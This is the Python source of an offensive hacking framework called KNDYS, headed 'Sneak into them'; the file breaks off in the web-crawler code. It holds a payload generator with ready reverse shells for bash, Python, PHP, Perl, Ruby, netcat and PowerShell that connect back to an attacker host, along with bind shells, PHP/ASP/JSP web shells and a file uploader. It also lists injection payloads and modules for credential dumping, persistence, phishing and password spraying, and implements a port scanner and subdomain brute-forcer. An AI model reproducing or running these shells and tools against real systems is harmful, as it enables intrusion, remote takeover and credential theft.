#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KNDYS - Sneak into them
"""

import os
import sys
import time
import random
import threading
import socket
import subprocess
import json
import hashlib
import base64
import re
import ssl
import zipfile
import tarfile
import csv
import xml.etree.ElementTree as ET
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote, unquote
import concurrent.futures
import ipaddress
import itertools
import string
import struct
import platform
import argparse
import readline
import getpass
import mimetypes
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any

# External libraries (install with: pip install -r requirements.txt)
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[-] Requests library not found. Install with: pip install requests")
    sys.exit(1)

try:
    from colorama import Fore, Style, Back, init
    init(autoreset=True)
    COLORS = True
except ImportError:
    # Fallback to basic colors
    class Fore:
        RED = YELLOW = GREEN = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    COLORS = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False

try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    import sqlite3
    DB_AVAILABLE = True
except ImportError:
    DB_AVAILABLE = False

# Banner
BANNER = f"""
{Fore.CYAN}{Style.BRIGHT}
╔═════════════════════════════════════════════════╗
║                                                 ║
║   ██╗  ██╗███╗   ██╗██████╗ ██╗   ██╗███████╗   ║
║   ██║ ██╔╝████╗  ██║██╔══██╗╚██╗ ██╔╝██╔════╝   ║
║   █████╔╝ ██╔██╗ ██║██║  ██║ ╚████╔╝ ███████╗   ║
║   ██╔═██╗ ██║╚██╗██║██║  ██║  ╚██╔╝  ╚════██║   ║
║   ██║  ██╗██║ ╚████║██████╔╝   ██║   ███████║   ║
║   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   ╚══════╝   ║
║                                                 ║
║       "sweet candys for the fat guy"            ║
║                                                 ║
║                                                 ║
╚═════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

class Logger:
    """Logging system"""
    def __init__(self):
        self.log_file = f"kndys_session_{int(time.time())}.log"
        self.session_file = f"kndys_session_{int(time.time())}.json"
        
    def log(self, message, level="INFO"):
        """Log message to file and console"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry + "\n")
            
        # Save to session file
        self.save_session(message)
        
    def save_session(self, data):
        """Save data to session file"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r', encoding='utf-8') as f:
                    session_data = json.load(f)
            else:
                session_data = {"actions": [], "findings": [], "credentials": []}
                
            session_data["actions"].append({
                "timestamp": datetime.now().isoformat(),
                "data": str(data)
            })
            
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2)
        except:
            pass

class ExploitDB:
    """Local exploit database"""
    def __init__(self):
        self.exploits = self.load_exploits()
        
    def load_exploits(self):
        """Load exploit database"""
        exploits = {
            # Web exploits
            "web": [
                {
                    "id": "EX-001",
                    "name": "SQL Injection Classic",
                    "description": "Classic SQL injection attack",
                    "type": "web",
                    "port": 80,
                    "payload": "' OR '1'='1' --"
                },
                {
                    "id": "EX-002",
                    "name": "XSS Reflected",
                    "description": "Reflected Cross-Site Scripting",
                    "type": "web",
                    "port": 80,
                    "payload": "<script>alert('XSS')</script>"
                },
                {
                    "id": "EX-003",
                    "name": "Command Injection",
                    "description": "OS Command Injection",
                    "type": "web",
                    "port": 80,
                    "payload": "; ls -la"
                }
            ],
            # Network exploits
            "network": [
                {
                    "id": "EX-101",
                    "name": "SMB EternalBlue",
                    "description": "MS17-010 SMB Vulnerability",
                    "type": "network",
                    "port": 445,
                    "payload": "eternalblue"
                },
                {
                    "id": "EX-102",
                    "name": "Heartbleed",
                    "description": "OpenSSL Heartbleed Vulnerability",
                    "type": "network",
                    "port": 443,
                    "payload": "heartbleed"
                }
            ],
            # Service-specific exploits
            "services": [
                {
                    "id": "EX-201",
                    "name": "FTP Anonymous Login",
                    "description": "FTP server with anonymous login enabled",
                    "type": "service",
                    "port": 21,
                    "payload": "anonymous"
                },
                {
                    "id": "EX-202",
                    "name": "SSH Brute Force",
                    "description": "SSH password brute force attack",
                    "type": "service",
                    "port": 22,
                    "payload": "ssh_brute"
                }
            ]
        }
        return exploits
        
    def search_exploits(self, query):
        """Search for exploits"""
        results = []
        for category, exploit_list in self.exploits.items():
            for exploit in exploit_list:
                if query.lower() in exploit["name"].lower() or query.lower() in exploit["description"].lower():
                    results.append(exploit)
        return results

class PayloadGenerator:
    """Payload generation system"""
    def __init__(self):
        self.payloads = {}
        self.load_payloads()
        
    def load_payloads(self):
        """Load all payload templates"""
        self.payloads = {
            # Reverse Shells
            "reverse_shell": {
                "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
                "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
                "python3": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
                "php": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "perl": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "nc": "nc -e /bin/sh {LHOST} {LPORT}",
                "nc_traditional": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
                "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
                "java": """java -e 'String host="{LHOST}";int port={LPORT};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}} catch (Exception e){{}} }};p.destroy();s.close();'"""
            },
            
            # Bind Shells
            "bind_shell": {
                "bash": "bash -i >& /dev/tcp/{LPORT}/0.0.0.0 0>&1",
                "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
                "nc": "nc -lvp {LPORT} -e /bin/sh"
            },
            
            # Web Shells
            "web_shell": {
                "php": """<?php system($_GET['cmd']); ?>""",
                "php_advanced": """<?php if(isset($_REQUEST['cmd'])){{echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}} ?>""",
                "asp": """<%@ Language=VBScript %><% If Request("cmd") <> "" Then ExecuteGlobal(Request("cmd")) %>""",
                "jsp": """<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>"""
            },
            
            # Meterpreter Payloads
            "meterpreter": {
                "windows_x64": "windows/x64/meterpreter/reverse_tcp",
                "windows_x86": "windows/meterpreter/reverse_tcp",
                "linux_x64": "linux/x64/meterpreter/reverse_tcp",
                "android": "android/meterpreter/reverse_tcp"
            },
            
            # File Upload
            "file_upload": {
                "php_uploader": """<?php $uploaddir = '/tmp/'; $uploadfile = $uploaddir . basename($_FILES['file']['name']); if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) { echo "File uploaded successfully."; } else { echo "File upload failed."; } ?>"""
            }
        }
        
    def generate(self, payload_type, platform="bash", **kwargs):
        """Generate payload with substitutions"""
        if payload_type in self.payloads and platform in self.payloads[payload_type]:
            payload = self.payloads[payload_type][platform]
            for key, value in kwargs.items():
                payload = payload.replace(f"{{{key}}}", str(value))
            return payload
        return None

class KNDYSFramework:
    """Main KNDYS Framework class"""
    def __init__(self):
        self.current_module = None
        self.module_options = {}
        self.targets = []
        self.running = False
        self.session_id = self.generate_session_id()
        self.logger = Logger()
        self.exploit_db = ExploitDB()
        self.payload_gen = PayloadGenerator()
        self.wordlists = {}
        self.credentials = {}
        self.initialize_modules()
        self.initialize_wordlists()
        self.load_config()
        
    def generate_session_id(self):
        """Generate unique session ID"""
        return hashlib.md5(str(time.time()).encode()).hexdigest()[:10]
    
    def load_config(self):
        """Load configuration"""
        self.config = {
            "lhost": self.get_local_ip(),
            "lport": 4444,
            "rhost": "",
            "rport": "",
            "threads": 50,
            "timeout": 5,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "proxy": None,
            "verbose": True
        }
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def display_banner(self):
        """Display KNDYS banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        
        # Show system info
        print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Session ID: {self.session_id}")
        print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[*] Local IP: {self.config['lhost']}")
        print(f"[*] Platform: {platform.system()} {platform.release()}")
        print(f"[*] Python: {platform.python_version()}")
        print(f"[*] Type 'help' for commands or 'show modules' to begin{Style.RESET_ALL}\n")
        
        # Show warnings for missing dependencies
        if not NMAP_AVAILABLE:
            print(f"{Fore.YELLOW}[!] nmap module not available. Install with: pip install python-nmap")
        if not SCAPY_AVAILABLE:
            print(f"{Fore.YELLOW}[!] scapy module not available. Install with: pip install scapy")
        if not SSH_AVAILABLE:
            print(f"{Fore.YELLOW}[!] paramiko module not available. Install with: pip install paramiko")
        if not BS4_AVAILABLE:
            print(f"{Fore.YELLOW}[!] BeautifulSoup not available. Install with: pip install beautifulsoup4")
        print()
    
    def initialize_modules(self):
        """Initialize all available modules"""
        self.modules = {
            # Reconnaissance Modules
            'recon': {
                'port_scanner': {
                    'description': 'Advanced TCP/UDP port scanner with service detection',
                    'options': {
                        'target': '192.168.1.1',
                        'ports': '1-1000',
                        'threads': '50',
                        'timeout': '2',
                        'scan_type': 'tcp_connect'
                    }
                },
                'subdomain_scanner': {
                    'description': 'Subdomain enumeration with DNS brute forcing',
                    'options': {
                        'domain': 'example.com',
                        'wordlist': 'subdomains.txt',
                        'threads': '20',
                        'output': 'subdomains.txt'
                    }
                },
                'web_crawler': {
                    'description': 'Advanced website crawler with vulnerability detection',
                    'options': {
                        'url': 'http://example.com',
                        'depth': '3',
                        'threads': '10',
                        'extensions': 'php,html,asp,aspx,jsp'
                    }
                },
                'network_mapper': {
                    'description': 'Network discovery and mapping',
                    'options': {
                        'network': '192.168.1.0/24',
                        'ping': 'true',
                        'ports': '22,80,443,445'
                    }
                },
                'os_detection': {
                    'description': 'Remote OS detection using TCP/IP fingerprinting',
                    'options': {
                        'target': '192.168.1.1',
                        'ports': '22,80,443'
                    }
                }
            },
            
            # Vulnerability Scanning Modules
            'scan': {
                'vuln_scanner': {
                    'description': 'Comprehensive vulnerability scanner',
                    'options': {
                        'target': 'http://example.com',
                        'scan_type': 'full',
                        'output': 'vuln_report.html'
                    }
                },
                'sql_scanner': {
                    'description': 'Advanced SQL injection scanner with exploitation',
                    'options': {
                        'url': 'http://example.com/page.php?id=1',
                        'technique': 'time_based,error_based,boolean',
                        'threads': '5'
                    }
                },
                'xss_scanner': {
                    'description': 'Cross-Site Scripting vulnerability scanner',
                    'options': {
                        'url': 'http://example.com',
                        'method': 'GET',
                        'parameters': 'all'
                    }
                },
                'csrf_scanner': {
                    'description': 'CSRF vulnerability detection',
                    'options': {
                        'url': 'http://example.com',
                        'forms': 'all'
                    }
                },
                'ssl_scanner': {
                    'description': 'SSL/TLS vulnerability scanner',
                    'options': {
                        'target': 'example.com:443',
                        'checks': 'all'
                    }
                },
                'dir_traversal': {
                    'description': 'Directory traversal vulnerability scanner',
                    'options': {
                        'url': 'http://example.com',
                        'depth': '3'
                    }
                }
            },
            
            # Exploitation Modules
            'exploit': {
                'multi_handler': {
                    'description': 'Multi/handler for receiving reverse connections',
                    'options': {
                        'lhost': self.config['lhost'],
                        'lport': '4444',
                        'payload': 'generic/shell_reverse_tcp'
                    }
                },
                'sql_injection': {
                    'description': 'SQL injection exploitation tool',
                    'options': {
                        'url': 'http://example.com/vuln.php?id=1',
                        'technique': 'union',
                        'dbms': 'mysql',
                        'dump': 'true'
                    }
                },
                'xss_exploit': {
                    'description': 'XSS exploitation with cookie stealing',
                    'options': {
                        'url': 'http://example.com/search.php?q=',
                        'payload': 'xss_cookie_stealer',
                        'server': 'localhost:8080'
                    }
                },
                'command_injection': {
                    'description': 'Command injection exploitation',
                    'options': {
                        'url': 'http://example.com/cmd.php',
                        'parameter': 'cmd',
                        'os': 'linux'
                    }
                },
                'file_upload': {
                    'description': 'File upload vulnerability exploitation',
                    'options': {
                        'url': 'http://example.com/upload.php',
                        'parameter': 'file',
                        'shell': 'php'
                    }
                },
                'buffer_overflow': {
                    'description': 'Buffer overflow exploitation framework',
                    'options': {
                        'target': '192.168.1.100:9999',
                        'fuzzer': 'true',
                        'pattern_create': '1000'
                    }
                }
            },
            
            # Post-Exploitation Modules
            'post': {
                'shell': {
                    'description': 'Interactive system shell',
                    'options': {
                        'session': '1',
                        'command': 'whoami'
                    }
                },
                'file_explorer': {
                    'description': 'Remote file system explorer',
                    'options': {
                        'session': '1',
                        'path': '/'
                    }
                },
                'privilege_escalation': {
                    'description': 'Automated privilege escalation checks',
                    'options': {
                        'session': '1',
                        'check': 'all'
                    }
                },
                'credential_dumper': {
                    'description': 'Extract credentials from compromised system',
                    'options': {
                        'session': '1',
                        'os': 'windows'
                    }
                },
                'persistence': {
                    'description': 'Establish persistence on compromised system',
                    'options': {
                        'session': '1',
                        'method': 'service'
                    }
                },
                'pivot': {
                    'description': 'Network pivoting and lateral movement',
                    'options': {
                        'session': '1',
                        'target': '192.168.2.0/24'
                    }
                }
            },
            
            # Password Attacks
            'password': {
                'brute_force': {
                    'description': 'Password brute force attacks',
                    'options': {
                        'target': 'ssh://192.168.1.1:22',
                        'username': 'admin',
                        'wordlist': 'passwords.txt',
                        'service': 'ssh'
                    }
                },
                'hash_cracker': {
                    'description': 'Hash cracking with multiple algorithms',
                    'options': {
                        'hash': '5f4dcc3b5aa765d61d8327deb882cf99',
                        'type': 'md5',
                        'wordlist': 'rockyou.txt'
                    }
                },
                'spray_attack': {
                    'description': 'Password spray attack',
                    'options': {
                        'target': 'owa.example.com',
                        'usernames': 'users.txt',
                        'passwords': 'passwords.txt',
                        'delay': '10'
                    }
                },
                'credential_stuffing': {
                    'description': 'Credential stuffing attack',
                    'options': {
                        'target': 'http://example.com/login',
                        'credentials': 'creds.txt',
                        'threads': '5'
                    }
                }
            },
            
            # Wireless Modules
            'wireless': {
                'wifi_scanner': {
                    'description': 'WiFi network scanner',
                    'options': {
                        'interface': 'wlan0',
                        'channel': 'all'
                    }
                },
                'wifi_cracker': {
                    'description': 'WPA/WPA2 handshake cracker',
                    'options': {
                        'handshake': 'capture.pcap',
                        'wordlist': 'rockyou.txt',
                        'bssid': '00:11:22:33:44:55'
                    }
                },
                'rogue_ap': {
                    'description': 'Rogue access point creator',
                    'options': {
                        'interface': 'wlan0',
                        'ssid': 'Free_WiFi',
                        'channel': '6'
                    }
                }
            },
            
            # Social Engineering
            'social': {
                'phishing': {
                    'description': 'Phishing campaign creator',
                    'options': {
                        'template': 'office365',
                        'targets': 'emails.txt',
                        'server': 'smtp.gmail.com'
                    }
                },
                'credential_harvester': {
                    'description': 'Credential harvesting server',
                    'options': {
                        'port': '80',
                        'template': 'facebook',
                        'redirect': 'https://facebook.com'
                    }
                },
                'website_cloner': {
                    'description': 'Website cloner for phishing',
                    'options': {
                        'url': 'https://facebook.com',
                        'output': 'phish_site'
                    }
                }
            },
            
            # Reporting
            'report': {
                'report_generator': {
                    'description': 'Generate professional pentest reports',
                    'options': {
                        'format': 'html',
                        'template': 'default',
                        'output': 'pentest_report'
                    }
                },
                'evidence_collector': {
                    'description': 'Collect evidence and screenshots',
                    'options': {
                        'session': '1',
                        'output': 'evidence.zip'
                    }
                }
            }
        }
    
    def initialize_wordlists(self):
        """Initialize common wordlists"""
        self.wordlists = {
            'subdomains': [
                'www', 'mail', 'ftp', 'admin', 'webmail', 'server', 'ns1', 'ns2',
                'blog', 'api', 'dev', 'test', 'staging', 'secure', 'portal', 'vpn',
                'mx', 'smtp', 'pop', 'imap', 'web', 'en', 'es', 'fr', 'de', 'it'
            ],
            'directories': [
                'admin', 'administrator', 'backup', 'backups', 'bin', 'config',
                'configuration', 'css', 'data', 'db', 'database', 'doc', 'docs',
                'download', 'downloads', 'error', 'errors', 'images', 'img',
                'include', 'includes', 'index', 'js', 'lib', 'library', 'log',
                'logs', 'media', 'old', 'php', 'private', 'pub', 'public',
                'script', 'scripts', 'secret', 'secure', 'src', 'sql', 'static',
                'style', 'styles', 'tmp', 'temp', 'template', 'templates',
                'test', 'tests', 'upload', 'uploads', 'user', 'users', 'var',
                'web', 'webapp', 'webapps', 'wordpress', 'wp', 'wp-admin',
                'wp-content', 'wp-includes', 'xml', 'xsl'
            ],
            'passwords': [
                'password', '123456', '12345678', '1234', 'qwerty', '12345',
                'dragon', 'baseball', 'football', 'letmein', 'monkey', 'abc123',
                'mustang', 'michael', 'shadow', 'master', 'jennifer', '111111',
                'admin', 'welcome', 'pass', '123', '123123', 'admin123', 'root',
                'administrator', 'qwerty123', 'password1', '123qwe'
            ],
            'usernames': [
                'admin', 'administrator', 'root', 'user', 'test', 'guest',
                'info', 'webmaster', 'support', 'service', 'sysadmin',
                'operator', 'backup', 'postmaster', 'hostmaster', 'mail'
            ]
        }
    
    def show_modules(self, category=None):
        """Display available modules"""
        print(f"\n{Fore.CYAN}{Style.BRIGHT}[ AVAILABLE MODULES ]{Style.RESET_ALL}\n")
        
        if category and category in self.modules:
            print(f"{Fore.YELLOW}{category.upper()}:{Style.RESET_ALL}")
            for module_name, module_info in self.modules[category].items():
                print(f"  {Fore.GREEN}{module_name:25}{Style.RESET_ALL} - {module_info['description']}")
        else:
            for category_name, modules in self.modules.items():
                print(f"\n{Fore.YELLOW}{category_name.upper()}:{Style.RESET_ALL}")
                for module_name, module_info in modules.items():
                    print(f"  {Fore.GREEN}{module_name:25}{Style.RESET_ALL} - {module_info['description']}")
    
    def use_module(self, module_path):
        """Select a module to use"""
        category = None
        module_name = None
        
        # Parse module path
        if '/' in module_path:
            parts = module_path.split('/')
            if len(parts) == 2:
                category, module_name = parts
        else:
            # Search in all categories
            for cat, modules in self.modules.items():
                if module_path in modules:
                    category = cat
                    module_name = module_path
                    break
        
        if not category or not module_name:
            print(f"{Fore.RED}[!] Module not found: {module_path}{Style.RESET_ALL}")
            return False
        
        self.current_module = f"{category}/{module_name}"
        self.module_options = self.modules[category][module_name]['options'].copy()
        
        print(f"{Fore.GREEN}[+] Using module: {self.current_module}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Description: {self.modules[category][module_name]['description']}{Style.RESET_ALL}")
        
        self.show_options()
        return True
    
    def show_options(self):
        """Show current module options"""
        if not self.current_module:
            print(f"{Fore.RED}[!] No module selected{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{Style.BRIGHT}[ MODULE OPTIONS ]{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Module: {self.current_module}{Style.RESET_ALL}\n")
        
        for option, value in self.module_options.items():
            print(f"  {Fore.GREEN}{option:20}{Style.RESET_ALL} => {value}")
    
    def set_option(self, option, value):
        """Set module option"""
        if not self.current_module:
            print(f"{Fore.RED}[!] No module selected{Style.RESET_ALL}")
            return
        
        if option not in self.module_options:
            print(f"{Fore.RED}[!] Invalid option: {option}{Style.RESET_ALL}")
            return
        
        self.module_options[option] = value
        print(f"{Fore.GREEN}[+] Set {option} => {value}{Style.RESET_ALL}")
    
    # ============ MODULE IMPLEMENTATIONS ============
    
    def run_module(self):
        """Execute the current module"""
        if not self.current_module:
            print(f"{Fore.RED}[!] No module selected{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Running module: {self.current_module}{Style.RESET_ALL}")
        self.logger.log(f"Running module: {self.current_module}")
        
        # Parse category and module name
        parts = self.current_module.split('/')
        if len(parts) == 2:
            category, module_name = parts
        else:
            print(f"{Fore.RED}[!] Invalid module format{Style.RESET_ALL}")
            return
        
        # Route to appropriate module handler
        module_handlers = {
            # Recon modules
            'port_scanner': self.run_port_scanner,
            'subdomain_scanner': self.run_subdomain_scanner,
            'web_crawler': self.run_web_crawler,
            'network_mapper': self.run_network_mapper,
            'os_detection': self.run_os_detection,
            
            # Scan modules
            'vuln_scanner': self.run_vuln_scanner,
            'sql_scanner': self.run_sql_scanner,
            'xss_scanner': self.run_xss_scanner,
            'ssl_scanner': self.run_ssl_scanner,
            'dir_traversal': self.run_dir_traversal,
            
            # Exploit modules
            'multi_handler': self.run_multi_handler,
            'sql_injection': self.run_sql_injection,
            'xss_exploit': self.run_xss_exploit,
            'command_injection': self.run_command_injection,
            'file_upload': self.run_file_upload,
            'buffer_overflow': self.run_buffer_overflow,
            
            # Password modules
            'brute_force': self.run_brute_force,
            'hash_cracker': self.run_hash_cracker,
            'spray_attack': self.run_spray_attack,
            
            # Tools
            'report_generator': self.run_report_generator,
        }
        
        if module_name in module_handlers:
            try:
                module_handlers[module_name]()
            except Exception as e:
                print(f"{Fore.RED}[!] Error executing module: {str(e)}{Style.RESET_ALL}")
                self.logger.log(f"Module error: {str(e)}", "ERROR")
        else:
            print(f"{Fore.YELLOW}[*] Module {module_name} not yet implemented{Style.RESET_ALL}")
    
    # ============ RECON MODULES ============
    
    def run_port_scanner(self):
        """Advanced port scanner with service detection"""
        target = self.module_options['target']
        ports_range = self.module_options['ports']
        threads = int(self.module_options.get('threads', 50))
        timeout = float(self.module_options.get('timeout', 2))
        scan_type = self.module_options.get('scan_type', 'tcp_connect')
        
        print(f"{Fore.CYAN}[*] Scanning {target} on ports {ports_range}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Scan type: {scan_type}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using {threads} threads, timeout: {timeout}s{Style.RESET_ALL}\n")
        
        # Parse ports
        if '-' in ports_range:
            start, end = map(int, ports_range.split('-'))
            ports = list(range(start, end + 1))
        elif ',' in ports_range:
            ports = [int(p.strip()) for p in ports_range.split(',')]
        else:
            ports = [int(ports_range)]
        
        open_ports = []
        banners = {}
        
        def scan_port(port):
            try:
                if scan_type == 'tcp_connect':
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target, port))
                    
                    if result == 0:
                        # Try to get banner
                        try:
                            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                            banner = sock.recv(1024).decode('utf-8', errors='ignore')
                            if banner:
                                banners[port] = banner[:100]
                        except:
                            banners[port] = "No banner"
                        
                        sock.close()
                        return port, True
                    sock.close()
            except Exception as e:
                pass
            return port, False
        
        # Scan ports
        print(f"{Fore.BLUE}[*] Starting port scan...{Style.RESET_ALL}")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(scan_port, port): port for port in ports}
            
            for future in concurrent.futures.as_completed(futures):
                port, is_open = future.result()
                if is_open:
                    open_ports.append(port)
                    service = self.get_service_name(port)
                    banner_info = banners.get(port, "")
                    print(f"{Fore.GREEN}[+] Port {port}/TCP open - {service}{Style.RESET_ALL}")
                    if banner_info:
                        print(f"      Banner: {banner_info[:50]}...")
        
        print(f"\n{Fore.CYAN}[*] Scan completed{Style.RESET_ALL}")
        if open_ports:
            print(f"{Fore.GREEN}[+] Open ports: {', '.join(map(str, sorted(open_ports)))}{Style.RESET_ALL}")
            
            # Generate service summary
            print(f"\n{Fore.YELLOW}[*] Service Summary:{Style.RESET_ALL}")
            for port in sorted(open_ports):
                service = self.get_service_name(port)
                print(f"  Port {port}: {service}")
        else:
            print(f"{Fore.YELLOW}[*] No open ports found{Style.RESET_ALL}")
    
    def get_service_name(self, port):
        """Get service name for common ports"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
            1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
            8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 27017: 'MongoDB',
            11211: 'Memcached'
        }
        return services.get(port, 'Unknown')
    
    def run_subdomain_scanner(self):
        """Subdomain enumeration tool"""
        domain = self.module_options['domain']
        wordlist_file = self.module_options.get('wordlist', '')
        threads = int(self.module_options.get('threads', 20))
        
        print(f"{Fore.CYAN}[*] Enumerating subdomains for {domain}{Style.RESET_ALL}")
        
        # Load wordlist
        wordlist = self.wordlists['subdomains']
        if wordlist_file and os.path.exists(wordlist_file):
            try:
                with open(wordlist_file, 'r', encoding='utf-8') as f:
                    wordlist = [line.strip() for line in f if line.strip()]
            except:
                print(f"{Fore.YELLOW}[!] Could not load wordlist, using built-in{Style.RESET_ALL}")
        
        found_subdomains = []
        
        def check_subdomain(sub):
            full_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                return full_domain, ip
            except socket.gaierror:
                return None
        
        print(f"{Fore.BLUE}[*] Checking {len(wordlist)} subdomains...{Style.RESET_ALL}")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_subdomain, sub): sub for sub in wordlist}
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    subdomain, ip = result
                    found_subdomains.append((subdomain, ip))
                    print(f"{Fore.GREEN}[+] Found: {subdomain} -> {ip}{Style.RESET_ALL}")
        
        # Also check common patterns
        common_patterns = [
            f"www.{domain}", f"mail.{domain}", f"ftp.{domain}",
            f"admin.{domain}", f"webmail.{domain}", f"vpn.{domain}"
        ]
        
        for pattern in common_patterns:
            try:
                ip = socket.gethostbyname(pattern)
                if (pattern, ip) not in found_subdomains:
                    found_subdomains.append((pattern, ip))
                    print(f"{Fore.GREEN}[+] Found: {pattern} -> {ip}{Style.RESET_ALL}")
            except:
                pass
        
        print(f"\n{Fore.CYAN}[*] Enumeration completed{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found {len(found_subdomains)} subdomains{Style.RESET_ALL}")
        
        # Save results
        if found_subdomains:
            output_file = f"subdomains_{domain}_{int(time.time())}.txt"
            with open(output_file, 'w', encoding='utf-8') as f:
                for subdomain, ip in found_subdomains:
                    f.write(f"{subdomain} -> {ip}\n")
            print(f"{Fore.YELLOW}[*] Results saved to: {output_file}{Style.RESET_ALL}")
    
    def run_web_crawler(self):
        """Advanced web crawler"""
        url = self.module_options['url']
        depth = int(self.module_options.get('depth', 3))
        threads = int(self.module_options.get('threads', 10))
        
        print(f"{Fore.CYAN}[*] Crawling {url} with depth {depth}{Style.RESET_ALL}")
        
        visited = set()
        to_visit = [(url, 0)]
        results = {
            'links': [],
            'forms': [],
            'files': [],
            'emails': [],
            'comments': []
        }
        
        def crawl(current_url, current_depth):
